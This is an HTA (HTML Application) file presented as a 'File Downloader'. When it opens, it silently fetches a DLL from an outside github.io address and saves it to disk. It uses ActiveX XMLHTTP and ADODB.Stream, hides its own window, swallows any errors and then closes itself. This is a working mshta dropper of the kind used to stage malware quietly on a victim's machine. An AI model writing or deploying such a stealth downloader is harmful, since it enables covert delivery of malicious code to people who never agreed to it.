<!DOCTYPE html>
<html>
<head>
    <title>File Downloader</title>

    <meta http-equiv="x-ua-compatible" content="ie=edge">

    <hta:application
        showintaskbar="no"
        singleinstance="yes"
        sysmenu="no"
        caption="no"
        border="none"
        scroll="no"
        windowstate="minimize">

    <script language="javascript">

        function downloadFile()
        {
            var url = "https://ospamox.github.io/mydll.dll";
            var savePath = "D:\\PYTHON\\C\\dll\\mshta\\mydll.dll";

            try
            {
                var xhr = new ActiveXObject("MSXML2.XMLHTTP");

                xhr.open("GET", url, false);
                xhr.send();

                if (xhr.status === 200)
                {
                    var adoStream = new ActiveXObject("ADODB.Stream");

                    adoStream.open();
                    adoStream.type = 1;
                    adoStream.write(xhr.responseBody);

                    adoStream.saveToFile(savePath, 2);

                    adoStream.close();
                }
            }
            catch (e)
            {
            }

            window.close();
        }

        window.onload = function()
        {
            downloadFile();
        };

    </script>
</head>

<body>
</body>
</html>
